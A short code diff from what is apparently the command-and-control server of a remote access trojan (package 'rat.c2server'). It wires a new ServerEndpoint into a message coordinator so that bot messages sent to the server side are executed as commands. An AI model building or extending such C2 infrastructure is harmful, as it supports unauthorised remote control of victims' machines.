@@ -3,6 +3,7 @@ package devs.alex.sah.rat.c2server.services.impl;
 import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
 import devs.alex.sah.rat.c2server.models.AssociativePair;
 import devs.alex.sah.rat.c2server.services.MessagesBuilder;
+import devs.alex.sah.rat.c2server.services.ServerEndpoint;
 import lombok.extern.slf4j.Slf4j;
 import devs.alex.sah.rat.c2server.models.Message;
 import devs.alex.sah.rat.c2server.services.MessagesCoordinator;
@@ -26,14 +27,16 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
 
     private final WebSocketSessionService botWSSessionService;
     private final WebSocketSessionService userWSSessionService;
+    private final ServerEndpoint serverEndpoint;
     private final MessagesBuilder messagesBuilder;
     private final MessagesConfiguration mConfig;
 
     public MessagesCoordinatorImpl(@Qualifier("botWebSocketSessionService") WebSocketSessionService botWSSessionService,
                                    @Qualifier("userWebSocketSessionService") WebSocketSessionService userWSSessionService,
-                                   MessagesBuilder messagesBuilder, MessagesConfiguration messagesConfiguration) {
+                                   ServerEndpoint serverEndpoint, MessagesBuilder messagesBuilder, MessagesConfiguration messagesConfiguration) {
         this.botWSSessionService = botWSSessionService;
         this.userWSSessionService = userWSSessionService;
+        this.serverEndpoint = serverEndpoint;
         this.messagesBuilder = messagesBuilder;
         this.mConfig = messagesConfiguration;
     }
@@ -204,7 +207,7 @@ public class MessagesCoordinatorImpl implements MessagesCoordinator {
             return;
         }
         if (message.getTargetType().equals(mConfig.targets.serverSide)) {
-            // TODO
+            serverEndpoint.executeCommand(ServerEndpoint.Sender.BOT, session,message);
         } else {
 
             WebSocketSession target = findTarget(message, message.getTargetType(), message.getTargetID(), mConfig.targets.controlSide, errors);
